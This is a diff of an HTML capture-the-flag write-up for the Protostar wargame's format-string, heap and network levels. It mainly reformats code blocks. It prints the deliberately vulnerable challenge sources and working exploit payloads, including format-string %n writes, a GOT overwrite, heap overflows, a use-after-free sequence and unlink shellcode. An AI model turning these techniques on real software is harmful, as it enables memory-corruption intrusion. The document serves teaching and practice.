                         This results in writing <i>target</i> lowest byte pair with 41. Therefore we need to add a couple of bytes in what we print with the '%x' to increase that value:
-                        <pre class="brush: python">
-                            python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
                     </li>
                     <li>
                         The next step requires to write to the second-lowest byte pair. We repeat the spamming with a known patter appending it to the string that we already have: 
-                        <pre class="brush: python">
-                            python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AABBBBAA%x%x%x%x%x%x%x%x'" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AABBBBAA%x%x%x%x%x%x%x%x'" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
                         In this case we inserted also 'BBBB' in our spamming pattern, because on a first run just with 'AAAA' it looked like the bytes were not aligned properly to result in a clean address after the popping. After playing around, the right amount of pops is 8.
                     </li>
                     <li>
                         Our destination address is still the target address, but incremented by one as we are writing to a higher position. So, in our new string swap the pattern at the right position with the address, and replace the last '%x' with '%n'. Another two bytes of <i>target</i> will be written.
-                        <pre class="brush: python">
-                            python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
                         To get the right value in target we have to put a rather high value in the bytes printed by '%x'. This does not matter, even if it overflows, because we will be anyway overwriting the higher byte in the next step
                     </li>
                     <li>
                         Repeat the last two steps for the remainging bytes, remembering to increase the target address by one. When all the bytes are done and contain the right value, the challenge is done.
-                        <pre class="brush: python">
-                            python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n' + 'BBB\xf7\x96\x04\x08%125x%x%x%x%x%x' + '%n'" > /tmp/format3.in
-                            ./format3 < /tmp/format3.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n' + 'BBB\xf7\x96\x04\x08%125x%x%x%x%x%x' + '%n'" > /tmp/format3.in
+./format3 &lt; /tmp/format3.in</code></pre>
                     </li>
                 </ol>
             </section>
@@ -820,28 +753,26 @@ title: Protostar
             <section>
                 <h3>Format 4</h3>
                 <h4>Redirect execution in a process</h4>
-                <pre class="brush: c">
-                    int target;
+                <pre><code class="cpp">int target;
 
-                    void hello(){
-                      printf("code execution redirected! you win\n");
-                      _exit(1);
-                    }
+void hello(){
+    printf("code execution redirected! you win\n");
+    _exit(1);
+}
 
-                    void vuln(){
-                      char buffer[512];
+void vuln(){
+    char buffer[512];
 
-                      fgets(buffer, sizeof(buffer), stdin);
+    fgets(buffer, sizeof(buffer), stdin);
 
-                      printf(buffer);
+    printf(buffer);
 
-                      exit(1);   
-                    }
+    exit(1);   
+}
 
-                    int main(int argc, char **argv){
-                      vuln();
-                    }
-                </pre>
+int main(int argc, char **argv){
+    vuln();
+}</code></pre>
 
                 <blockquote><b>Global Offset Table:</b> also called GOT, it is a table of addresses stored in the data section. During runtime it lists addresses of global variables: when the program runs for the first time, the GOT is initialized to 0x00000000 for every external function; the first time it runs that function, it will cache the actual memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. To see the (uninitialized) GOT we can use <code>objdump -R</code></blockquote>
 
@@ -855,17 +786,13 @@ title: Protostar
                 <ol>
                     <li>
                         The challenge is exactly the same as in the previous level, but instead of overwriting a variable we have to overwrite an address to which we want to jump. This address is the one of the <i>exit()</i> method (not _exit, as that would be called only after the exploit has already been done), that we can retrieve from the GOT table. The new address, meaning the one of the <i>hello()</i> method, is found with the usual command.
-                        <pre class="brush: bash">
-                            objdump -R format4 | grep exit
-                            objdump -t format4 | grep hello
-                        </pre>
+                        <pre><code class="bash">objdump -R format4 | grep exit
+objdump -t format4 | grep hello</code></pre>
                         This tells us that our target address is <code>0x08049724</code> and our new address is <code>0x080484b4</code>
                     </li>
                     <li>
                         There might be a little trick in the address of <i>exit</i>: if the method has never been executed before, what we get with the lookup is only the position in the GOT table. To actually know where the method is we need to fire up gdb, start up the program and look into what is in that address:
-                        <pre class="brush: bash">
-                            x/i 0x08049724
-                        </pre>
+                        <pre><code class="bash">x/i 0x08049724</code>                        </pre>
                         Although it might be worth looking, executing format4 at least once before inspecting the GOT table should solve the problem. If you reach the end and there stuff is not working, maybe take a look at this step and check that you are working with the proper address.
                     </li>
                     <li>
@@ -874,10 +801,8 @@ title: Protostar
                     </li>
                     <li>
                         The finished payload looks like the following:
-                        <pre class="brush: python">
-                            python -c "print '\x24\x97\x04\x08' + '%160x%x%x' + '%n' + 'A\x25\x97\x04\x08BBB' + '%184x%x%x' + '%n' + 'AA\x26\x97\x04\x08AA' + '%352x%x%x%x' + '%n' + 'A\x27\x97\x04\x08CDD' + '%228x%x%x%x' + '%n'" > /tmp/format4.in
-                            ./format4 < /tmp/format4.in
-                        </pre>
+                        <pre><code class="bash">python -c "print '\x24\x97\x04\x08' + '%160x%x%x' + '%n' + 'A\x25\x97\x04\x08BBB' + '%184x%x%x' + '%n' + 'AA\x26\x97\x04\x08AA' + '%352x%x%x%x' + '%n' + 'A\x27\x97\x04\x08CDD' + '%228x%x%x%x' + '%n'" > /tmp/format4.in
+./format4 &lt; /tmp/format4.in</code></pre>
                     </li>
                 </ol>
             </section>
@@ -887,38 +812,36 @@ title: Protostar
             <section>
                 <h3>Heap 0</h3>
                 <h4>Heap overflow to influence code flow</h4>
-                <pre class="brush: c">
-                    struct data {
-                      char name[64];
-                    };
+                <pre>
+    char name[64];
+};
 
-                    struct fp {
-                      int (*fp)();
-                    };
+struct fp {
+    int (*fp)();
+};
 
-                    void winner(){
-                      printf("level passed\n");
-                    }
+void winner(){
+    printf("level passed\n");
+}
 
-                    void nowinner(){
-                      printf("level has not been passed\n");
-                    }
+void nowinner(){
+    printf("level has not been passed\n");
+}
 
-                    int main(int argc, char **argv){
-                      struct data *d;
-                      struct fp *f;
+int main(int argc, char **argv){
+    struct data *d;
+    struct fp *f;
 
-                      d = malloc(sizeof(struct data));
-                      f = malloc(sizeof(struct fp));
-                      f->fp = nowinner;
+    d = malloc(sizeof(struct data));
+    f = malloc(sizeof(struct fp));
+    f->fp = nowinner;
 
-                      printf("data is at %p, fp is at %p\n", d, f);
+    printf("data is at %p, fp is at %p\n", d, f);
 
-                      strcpy(d->name, argv[1]);
-                      
-                      f->fp();
-                    }
-                </pre>
+    strcpy(d->name, argv[1]);
+    
+    f->fp();
+}</code></pre>
 
                 <blockquote><b>void* malloc( size_t size ):</b> allocates size bytes of uninitialized storage in the heap. If allocation succeeds, returns a pointer to the first byte in the allocated memory block that is suitably aligned for any object type.
                 </blockquote>
@@ -932,9 +855,7 @@ title: Protostar
                     </li>
                     <li>
                         The next step is to find out how long does the input that is used to initialize d need to be to overwrite f and its function pointer. We use the same <a href="http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/">technique</a> that we used for the stack challenges: run the program with gdb and the pattern:
-                        <pre class="brush: bash">
-                            gdb --args heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-                        </pre>
+                        <pre><code class="bash">gdb --args heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</code></pre>
                         We can see what the content of $eip is when the program goes into segmentation fault, and passing this value back to the website tells us that we have an offset of 72 bytes.
                     </li>
                     <li>
@@ -942,9 +863,7 @@ title: Protostar
                     </li>
                     <li>
                         So what we have to do is pass to heap0 72 bytes of whatever, and then the address of the <i>winner</i> method (remembering endianness):
-                        <pre class="brush: bash">
-                            ./heap0 `python -c "print 'A' * 72 + '\x64\x84\x04\x08'"`
-                        </pre>
+                        <pre><code class="bash">./heap0 `python -c "print 'A' * 72 + '\x64\x84\x04\x08'"`</code></pre>
                 </ol>
             </section>
 
@@ -953,33 +872,31 @@ title: Protostar
             <section>
                 <h3>Heap 1</h3>
                 <h4>Code flow hijacking in data overwrite cases.</h4>
-                <pre class="brush: c">
-                    struct internet {
-                      int priority;
-                      char *name;
-                    };
+                <pre><code class="cpp">struct internet {
+    int priority;
+    char *name;
+};
 
-                    void winner(){
-                      printf("and we have a winner @ %d\n", time(NULL));
-                    }
+void winner(){
+    printf("and we have a winner @ %d\n", time(NULL));
+}
 
-                    int main(int argc, char **argv){
-                      struct internet *i1, *i2, *i3;
+int main(int argc, char **argv){
+    struct internet *i1, *i2, *i3;
 
-                      i1 = malloc(sizeof(struct internet));
-                      i1->priority = 1;
-                      i1->name = malloc(8);
+    i1 = malloc(sizeof(struct internet));
+    i1->priority = 1;
+    i1->name = malloc(8);
 
-                      i2 = malloc(sizeof(struct internet));
-                      i2->priority = 2;
-                      i2->name = malloc(8);
+    i2 = malloc(sizeof(struct internet));
+    i2->priority = 2;
+    i2->name = malloc(8);
 
-                      strcpy(i1->name, argv[1]);
-                      strcpy(i2->name, argv[2]);
+    strcpy(i1->name, argv[1]);
+    strcpy(i2->name, argv[2]);
 
-                      printf("and that's a wrap folks!\n");
-                    }
-                </pre>
+    printf("and that's a wrap folks!\n");
+}</code></pre>
 
                 <ol>
                     <li>
@@ -995,19 +912,15 @@ title: Protostar
                     </li>
                     <li>
                         To find the location of the return address, we use gdb: disassemble main, put a breakpoint at the <i>ret</i> instruction, and when the breakpoint is reached look at what is the content of $esp:
-                        <pre class="brush: bash">
-                            gdb > disas main
-                            gdb > b **0x08048567
-                            gdb > run asdf asdf
-                            gdb > i r $esp
-                        </pre>
+                        <pre><code class="bash">gdb > disas main
+gdb > b **0x08048567
+gdb > run asdf asdf
+gdb > i r $esp</code></pre>
                         This tells us that $esp contains the return addres <code>0xbffff68c</code>
                     </li>
                     <li>
                         We have to keep in mind that when not using gdb, the addresses will not correspond exactly to what we have seen using the debugger. Therefore, the return address will not be precise. A workaround for this is to repeatedly write our own target address starting from a bit before what gdb told us, and continuing a bit after. With this approach, we are sure that at some point we will be writing at the right location.
-                        <pre class="brush: bash">
-                            ./heap1 `python -c "print 'A' * 20 + '\x60\xf6\xff\xbf' + ' ' + '\x94\x84\x04\x08' * 8"`
-                        </pre>
+                        <pre><code class="bash">./heap1 `python -c "print 'A' * 20 + '\x60\xf6\xff\xbf' + ' ' + '\x94\x84\x04\x08' * 8"`</code></pre>
                         The first argument is made by the 20 random bytes and a address lower than our known gdb-related return address, than we need a space to respect the syntax of the heap1 program, and then we have a sled of our target address. At some point the target address will be hit and we will reach the <i>winner</i> method.
                     </li>
                 </ol>
@@ -1018,46 +931,44 @@ title: Protostar
             <section>
                 <h3>Heap 2</h3>
                 <h4>What can happen when heap pointers are stale? (This level is completed when you see the “you have logged in already!” message)</h4>
-                <pre class="brush: c">
-                    struct auth {
-                      char name[32];
-                      int auth;
-                    };
+                <pre><code class="cpp">struct auth {
+    char name[32];
+    int auth;
+};
 
-                    struct auth *auth;
-                    char *service;
+struct auth *auth;
+char *service;
 
-                    int main(int argc, char **argv){
-                      char line[128];
+int main(int argc, char **argv){
+    char line[128];
 
-                      while(1) {
-                          printf("[ auth = %p, service = %p ]\n", auth, service);
+    while(1) {
+        printf("[ auth = %p, service = %p ]\n", auth, service);
 
-                          if(fgets(line, sizeof(line), stdin) == NULL) break;
-                          
-                          if(strncmp(line, "auth ", 5) == 0) {
-                              auth = malloc(sizeof(auth));
-                              memset(auth, 0, sizeof(auth));
-                              if(strlen(line + 5) < 31) {
-                                  strcpy(auth->name, line + 5);
-                              }
-                          }
-                          if(strncmp(line, "reset", 5) == 0) {
-                              free(auth);
-                          }
-                          if(strncmp(line, "service", 6) == 0) {
-                              service = strdup(line + 7);
-                          }
-                          if(strncmp(line, "login", 5) == 0) {
-                              if(auth->auth) {
-                                  printf("you have logged in already!\n");
-                              } else {
-                                  printf("please enter your password\n");
-                              }
-                          }
-                      }
-                    }
-                </pre>
+        if(fgets(line, sizeof(line), stdin) == NULL) break;
+        
+        if(strncmp(line, "auth ", 5) == 0) {
+            auth = malloc(sizeof(auth));
+            memset(auth, 0, sizeof(auth));
+            if(strlen(line + 5) &lt; 31) {
+                strcpy(auth->name, line + 5);
+            }
+        }
+        if(strncmp(line, "reset", 5) == 0) {
+            free(auth);
+        }
+        if(strncmp(line, "service", 6) == 0) {
+            service = strdup(line + 7);
+        }
+        if(strncmp(line, "login", 5) == 0) {
+            if(auth->auth) {
+                printf("you have logged in already!\n");
+            } else {
+                printf("please enter your password\n");
+            }
+        }
+    }
+}</code></pre>
 
                 <blockquote><b>Use after free:</b> this vulnerability is a type of memory corruption that corresponds to trying to access memory after it has been freed. This can cause a program to crash or to execute arbitrary code in case the freed memory has already been filled with new data.</blockquote>
 
@@ -1072,19 +983,17 @@ title: Protostar
                     </li>
                     <li>
                         Based on the fact that in the heap the space is allocated sequentially, putting new chunks immediately after already allocated ones, we can run our commands so that the following happens: we call <i>auth</i> to allocate the memory needed for that struct; then we call <i>reset</i> to free it. However, the "auth" pointer still exists in the program, although it should not be used anymore. The next step is to call <i>service</i> and pass it a bunch of '1': service will call <i>strdup</i>, which allocates space in the memory just freed by releasing auth. As last, we call <i>login</i>: the auth pointer will be used as if the respective memory was still legitimately in use, and if we passed enough 1s with the service call, one of those 1 will be interpreted as <i>auth->auth</i>, allowing us to get in.
-                        <pre class="brush: brash">
-                            ./heap2
-                                [ auth = (nil), service = (nil) ]
-                            auth AAAAAAAA
-                                [ auth = 0x804c008, service = (nil) ]
-                            reset
-                                [ auth = 0x804c008, service = (nil) ]
-                            service 11111111111111111111111111111
-                                [ auth = 0x804c008, service = 0x804c018 ]
-                            login
-                            you have logged in already!
-                                [ auth = 0x804c008, service = 0x804c018 ]
-                        </pre>
+                        <pre><code class="bash">./heap2
+    [ auth = (nil), service = (nil) ]
+auth AAAAAAAA
+    [ auth = 0x804c008, service = (nil) ]
+reset
+    [ auth = 0x804c008, service = (nil) ]
+service 11111111111111111111111111111
+    [ auth = 0x804c008, service = 0x804c018 ]
+login
+you have logged in already!
+    [ auth = 0x804c008, service = 0x804c018 ]</code></pre>
                     </li>
                 </ol>
             </section>
@@ -1094,40 +1003,36 @@ title: Protostar
             <section>
                 <h3>Heap 3</h3>
                 <h4>How heap meta data can be modified to change program execution.</h4>
-                <pre class="brush: c">
-                    void winner(){
-                      printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
-                    }
+                <pre><code class="cpp">void winner(){
+    printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
+}
 
-                    int main(int argc, char **argv){
-                      char *a, *b, *c;
+int main(int argc, char **argv){
+    char *a, *b, *c;
 
-                      a = malloc(32);
-                      b = malloc(32);
-                      c = malloc(32);
+    a = malloc(32);
+    b = malloc(32);
+    c = malloc(32);
 
-                      strcpy(a, argv[1]);
-                      strcpy(b, argv[2]);
-                      strcpy(c, argv[3]);
+    strcpy(a, argv[1]);
+    strcpy(b, argv[2]);
+    strcpy(c, argv[3]);
 
-                      free(c);
-                      free(b);
-                      free(a);
+    free(c);
+    free(b);
+    free(a);
 
-                      printf("dynamite failed?\n");
-                    }
-                </pre>
+    printf("dynamite failed?\n");
+}</code></pre>
 
                 <blockquote><b>Malloc chunk:</b>
                     Let's look at the structure of a free chunk of heap memory, as interpreted in malloc instructions:
-                    <pre class="brush: c">
-                    struct malloc_chunk {
-                        INTERNAL_SIZE_T     prev_size;
-                        INTERNAL_SIZE_T     size;
-                        struct malloc_chunk*    fd;
-                        struct malloc_chunk*    bk;
-                    }
-                    </pre>
+                    <pre><code class="cpp">struct malloc_chunk {
+    INTERNAL_SIZE_T     prev_size;
+    INTERNAL_SIZE_T     size;
+    struct malloc_chunk*    fd;
+    struct malloc_chunk*    bk;
+}</code></pre>
 
                     <ul>
                         <li>The <u>prev_size</u> member contains the size of the chunk previous to the current chunk. It is only used if the previous chunk is free.</li>
@@ -1142,7 +1047,7 @@ title: Protostar
 
                 <blockquote><b>ulink() technique:</b> upon calling <i>free</i>, the previous and following chunks are tested to see if they are in use (looking at the prev_size member). Adjacent free chunks will be consolidated together as a single chunk.
                     <div align="center">
-                        <img src="../../images/projects/protostar/heap3.png" width="800px">
+                        <img src="/images/projects/protostar/heap3.png" width="800px">
                     </div>
                     Actual <i>ulink</i> operations are:
                     <ul>
@@ -1155,42 +1060,38 @@ title: Protostar
                 <ol>
                     <li>
                         We know that a, b, and c will be allocated on the heap. Let's start gdb, but a breakpoint after the three allocation have been done and the input copied there, and take a look. To get the address, we can run <code>info proc map</code> and gdb will tell us where the heap starts. That's where we want to look.
-                        <pre class="brush: bash">
-                            (gdb) x/50x 0x804c000
-                            0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
-                            0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-                            0x804c030:  0x42424242  0x00000000  0x00000000  0x00000000
-                            0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
-                            0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-                            0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0c0:  0x00000000  0x00000000
-                        </pre>
+                        <pre><code class="bash">(gdb) x/50x 0x804c000
+    0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
+    0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+    0x804c030:  0x42424242  0x00000000  0x00000000  0x00000000
+    0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
+    0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+    0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0c0:  0x00000000  0x00000000</code></pre>
                         For each variable, we see that the size member is 0x00000029. This correponds to 00101001 in binary, meaning that the size is 40 bytes and that the previous chunk is in use.
                     </li>
                     <li>
                         We now let gdb run until the three chunks of memory are freed, and then we take a look at the heap again:
-                        <pre class="brush: bash">
-                            (gdb) x/50x 0x804c000
-                            0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
-                            0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
-                            0x804c030:  0x0804c050  0x00000000  0x00000000  0x00000000
-                            0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-                            0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
-                            0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
-                            0x804c0c0:  0x00000000  0x00000000
-                        </pre>
+                        <pre><code class="bash">(gdb) x/50x 0x804c000
+    0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
+    0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+    0x804c030:  0x0804c050  0x00000000  0x00000000  0x00000000
+    0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+    0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+    0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+    0x804c0c0:  0x00000000  0x00000000</code></pre>
                         We know that the memory is free, so we would expect all prev_size, size, fd and bk to be set properly. However, only fd actually is (also size is set, but does not signal the previous chunk as free): the reason is that these chunks are so small (less than 64 bytes) that they are not merged together upon freeing, but kept separated for the sake of speed. We can change this behaviour by controlling the size field and making it large enough to move the chunks from the so-called fastbin to the normal bin.
                     </li>
                     <li>
@@ -1199,9 +1100,7 @@ title: Protostar
                     </li>
                     <li>
                         We target the second argument of heap3, so that we can exploit fd and bk when it is freed. The first argument is 'AAAA' and the last 'DDDD', to be easily recognizable. The middle argument is filled with As until the allocated memory is full; then the heap smashing bytes and a recognizable pattern as data.
-                        <pre class="brush: python">
-                            ./heap3 `python -c "print 'AAAA ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAABBBBCCCC' + ' DDD'"`
-                        </pre>
+                        <pre><code class="bash">./heap3 `python -c "print 'AAAA ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAABBBBCCCC' + ' DDD'"`</code></pre>
                         Running this results in a segmentation fault as the system tries to move stuff around in adresses that do not actually exist.
                     </li>
                     <li>
@@ -1209,17 +1108,13 @@ title: Protostar
                     </li>
                     <li>
                         We can't just pass the <i>winner</i> address in the heap, because trying to write to it will cause a segmentation fault. Instead, we need to encode a call to it and a return. This can be done for example with an <a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">online assembler</a>:
-                        <pre class="bash">
-                            push 0x08048864
-                            ret
-                        </pre>
+                        <pre><code class="bash">push 0x08048864
+ret</code></pre>
                         The encoded instructions correspond to <code>\x68\x64\x88\x04\x08\xc3</code>, which also nicely fits into the 8 bytes that are available.
                     </li>
                     <li>
                         The resulting code is:
-                        <pre class="brush: bash">
-                            ./heap3 `python -c "print 'AAAA\x68\x64\x88\x04\x08\xc3' + ' ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAA' + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08' + ' ' + 'DDD'"`
-                        </pre>
+                        <pre><code class="bash">./heap3 `python -c "print 'AAAA\x68\x64\x88\x04\x08\xc3' + ' ' + 'A' * 32 + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + 'AAAA' + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08' + ' ' + 'DDD'"`</code></pre>
                         I have to admit that although the techniques used are mostly clear to me, I am still a bit confused about how all of it comes together. This code works, but breaking down the single parts and pointing where they will end up in memory is quite tricky.
                     </li>
                 </ol>
@@ -1230,50 +1125,48 @@ title: Protostar
             <section>
                 <h3>Net 0</h3>
                 <h4>Converting strings to little endian integers</h4>
-                <pre class="brush: c">
-                    #define NAME "net0"
-                    #define UID 999
-                    #define GID 999
-                    #define PORT 2999
+                <pre><code class="cpp">#define NAME "net0"
+#define UID 999
+#define GID 999
+#define PORT 2999
 
-                    void run(){
-                      unsigned int i;
-                      unsigned int wanted;
+void run(){
+    unsigned int i;
+    unsigned int wanted;
 
-                      wanted = random();
+    wanted = random();
 
-                      printf("Please send '%d' as a little endian 32bit int\n", wanted);
+    printf("Please send '%d' as a little endian 32bit int\n", wanted);
 
-                      if(fread(&i, sizeof(i), 1, stdin) == NULL) {
-                          errx(1, ":(\n");
-                      }
+    if(fread(&i, sizeof(i), 1, stdin) == NULL) {
+        errx(1, ":(\n");
+    }
 
-                      if(i == wanted) {
-                          printf("Thank you sir/madam\n");
-                      } else {
-                          printf("I'm sorry, you sent %d instead\n", i);
-                      }
-                    }
+    if(i == wanted) {
+        printf("Thank you sir/madam\n");
+    } else {
+        printf("I'm sorry, you sent %d instead\n", i);
+    }
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      int fd;
-                      char *username;
+int main(int argc, char **argv, char **envp){
+    int fd;
+    char *username;
 
-                      /* Run the process as a daemon */
-                      background_process(NAME, UID, GID); 
-                      
-                      /* Wait for socket activity and return */
-                      fd = serve_forever(PORT);
+    /* Run the process as a daemon */
+    background_process(NAME, UID, GID); 
+    
+    /* Wait for socket activity and return */
+    fd = serve_forever(PORT);
 
-                      /* Set the client socket to STDIN, STDOUT, and STDERR */
-                      set_io(fd);
+    /* Set the client socket to STDIN, STDOUT, and STDERR */
+    set_io(fd);
 
-                      /* Don't do this :> */
-                      srandom(time(NULL));
+    /* Don't do this :> */
+    srandom(time(NULL));
 
-                      run();
-                    }
-                </pre>
+    run();
+}</code></pre>
 
                 <ol>
                     <li>
@@ -1282,22 +1175,20 @@ title: Protostar
                     </li>
                     <li>
                         To solve the challenge, we can implement a simple python program that connects to the deamon, reads the sent number and sends it back in little endian fashion:
-                        <pre class="brush: python">
-                            import socket
-                            import re
-                            import struct
+                        <pre><code class="python">import socket
+import re
+import struct
 
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2999))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2999))
 
-                            data = s.recv(1024)
-                            num = data.split()[2][1:-1]
-                            num = int(num)
+data = s.recv(1024)
+num = data.split()[2][1:-1]
+num = int(num)
 
-                            s.send(struct.pack("i", num))
-                            print s.recv(1024)
-                            s.close()
-                        </pre>
+s.send(struct.pack("i", num))
+print s.recv(1024)
+s.close()</code></pre>
                     </li>
                     <li>
                         Just as a quick commenting of the code: the data that we receive always has the same structure, so if we split it (creating a list containing the elements that were separated by spaces), we know that the number will always be the 3rd element of the list. Also, from that element we want to leave out the first and last character, that are the ticks. What is left can be easily converted to integer.<br>
@@ -1311,8 +1202,7 @@ title: Protostar
             <section>
                 <h3>Net 1</h3>
                 <h4>Converting binary integers into ascii representation</h4>
-                <pre class="brush: c">
-                    #define NAME "net1"
+                <pre><code class="cpp">#define NAME "net1"
                     #define UID 998
                     #define GID 998
                     #define PORT 2998
@@ -1373,21 +1263,19 @@ title: Protostar
                     </li>
                     <li>
                         Also in this case we create a small python script that connects to the deamon, reads the data, manipulates it and sends it back.
-                        <pre class="brush: python">
-                            import socket
-                            import re
-                            import struct
+                        <pre><code class="python">import socket
+import re
+import struct
 
-                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            s.connect(("127.0.0.1", 2998))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 2998))
 
-                            data = s.recv(1024)
-                            num = struct.unpack("I", data)[0]
+data = s.recv(1024)
+num = struct.unpack("I", data)[0]
 
-                            s.send(str(num))
-                            print s.recv(1024)
-                            s.close()
-                        </pre>
+s.send(str(num))
+print s.recv(1024)
+s.close()</code></pre>
                         The script unpacks the data reading it as an integer number, and then we just send it back as string.
                     </li>
                 </ol>
@@ -1398,58 +1286,56 @@ title: Protostar
             <section>
                 <h3>Net 2</h3>
                 <h4>Adding 4 unsigned 32-bit integers (Keep in mind that it wraps)</h4>
-                <pre class="brush: c">
-                    #define NAME "net2"
-                    #define UID 997
-                    #define GID 997
-                    #define PORT 2997
+                <pre><code class="cpp">#define NAME "net2"
+#define UID 997
+#define GID 997
+#define PORT 2997
 
-                    void run(){
-                      unsigned int quad[4];
-                      int i;
-                      unsigned int result, wanted;
+void run(){
+    unsigned int quad[4];
+    int i;
+    unsigned int result, wanted;
 
-                      result = 0;
-                      for(i = 0; i < 4; i++) {
-                          quad[i] = random();
-                          result += quad[i];
+    result = 0;
+    for(i = 0; i &lt; 4; i++) {
+        quad[i] = random();
+        result += quad[i];
 
-                          if(write(0, &(quad[i]), sizeof(result)) != sizeof(result)) {
-                              errx(1, ":(\n");
-                          }
-                      }
+        if(write(0, &(quad[i]), sizeof(result)) != sizeof(result)) {
+            errx(1, ":(\n");
+        }
+    }
 
-                      if(read(0, &wanted, sizeof(result)) != sizeof(result)) {
-                          errx(1, ":<\n");
-                      }
+    if(read(0, &wanted, sizeof(result)) != sizeof(result)) {
+        errx(1, ":&lt;\n");
+    }
 
 
-                      if(result == wanted) {
-                          printf("you added them correctly\n");
-                      } else {
-                          printf("sorry, try again. invalid\n");
-                      }
-                    }
